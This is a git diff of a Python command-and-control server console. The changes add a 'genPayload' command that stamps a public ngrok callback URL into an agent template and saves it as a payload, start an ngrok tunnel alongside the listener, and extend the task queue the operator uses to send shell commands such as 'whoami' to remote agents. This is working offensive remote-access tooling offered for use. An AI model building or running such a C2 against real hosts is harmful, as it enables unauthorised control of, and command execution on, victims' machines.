@@ -8,7 +8,7 @@ import config
 from getpass import getpass
 from uuid import uuid4
 from subprocess import Popen, PIPE
-import time, _thread
+import time, _thread, os
 
 author = config.info()
 
@@ -27,8 +27,10 @@ man = {
         '!':'Runs a command locally. Usage: \'! ls | grep rtc2\'',
         'cmd':'Assign a command to selected agent. Usage: \'cmd "whoami"\'',
         'startServer':'Starts the listener',
-        'listTasks':'Show all tasks',
+        'tasklist':'Show all tasks',
         'getResult':'Show result for specific task. Usage: \'getResult 102\'',
+        'genPayload':'Generates a payload. Usage: \'genPayload python3\' (options: python3,)',
+        'taskkill':'Removes a task from the tasklist. Usage: \'taskkill 301\' (replace \'301\' with task id)',
         }
 
 def help_menu():
@@ -105,18 +107,19 @@ class Handler(object):
                                 return None
                         com = cmd.split('"')[1]
                         uid = str(uuid4())
-                        server.commands.append({'agent':var.current_agent,'uid':uid,'cmd':com})
+                        server.commands.append({'agent':var.current_agent,'id':uid,'cmd':com})
                         print(ok("Command added to tasklist"))
                         return None
                 elif base == "startServer":
                         _thread.start_new_thread(server.serve, ( ))
                         print(ok("Server running at [0.0.0.0:1029]"))
+                        _thread.start_new_thread(do_ngrok, ( ))
                         return None
-                elif base == "listTasks":
+                elif base == "tasklist":
                         tsk = server.commands
                         print("Tasks:")
                         for i in tsk:
-                                print("Agent: %s, cmd: %s, id: %s" % (c(i['agent'],"cyan"),c(i['cmd'],"cyan"),c(i['uid'],"cyan")))
+                                print("Agent: %s, cmd: %s, id: %s" % (c(i['agent'],"cyan"),c(i['cmd'],"cyan"),c(i['id'],"cyan")))
                         return None
                 elif base == "getResult":
                         try:
@@ -126,11 +129,40 @@ class Handler(object):
                                 return None
                         tsk = server.commands
                         for i in tsk:
-                                if i['uid'] == ID:
+                                if i['id'] == ID:
                                         if 'res' in i:
                                                 print(i['res'])
                                         else:
                                                 print("No result available")
+                        return None
+                elif base == "genPayload":
+                        try:
+                                paytype = cmd.split(" ")[1]
+                        except:
+                                paytype = "python3"
+                        try:
+                                tplate = open("templates/"+paytype,"r").read()
+                        except FileNotFoundError:
+                                print(fail("Template does not exist"))
+                                return None
+                        ngurl = ngrok.get_url()
+                        tplate = ("baseurl = \"%s\"\n" % ngurl) + tplate
+                        with open("/tmp/payload.py","w") as f:
+                                f.write(tplate)
+                        print(ok("Saved payload to /tmp/payload.py"))
+                        return None
+                elif base == "taskkill":
+                        try:
+                                id = cmd.split(" ")[1]
+                        except:
+                                print(error("Please specify task id"))
+                                return None
+                        for i in server.commands:
+                                if i['id'] == id:
+                                        server.commands.remove(i)
+                                        print(ok("Removed command"))
+                                        return None
+                        print(error("No command with that id found"))
                         return None
                 else:
                         print(error("Command not found / Invalid syntax"))
@@ -154,9 +186,8 @@ def do_ngrok():
 
 def start_sequence():
         print_banner()
-        #server.serve()
         files = Popen("find | grep ngrok",stdout=PIPE,shell=True).communicate()[0].decode()
-        if len(files) == 0:
+        if not len(files) == 16: # cuz ngrok.py
                 ver = config.cfg().ver
                 if ver == "64":
                         ngrok.download_64bit()
@@ -167,7 +198,6 @@ def start_sequence():
                 else:
                         print(fail("Incorrect OS version in config.py, using 64bit"))
                         ngrok.download_64bit()
-        #_thread.start_new_thread(do_ngrok, ( ))
 
 def exit_sequence():
         ngrok.kill_ngrok()
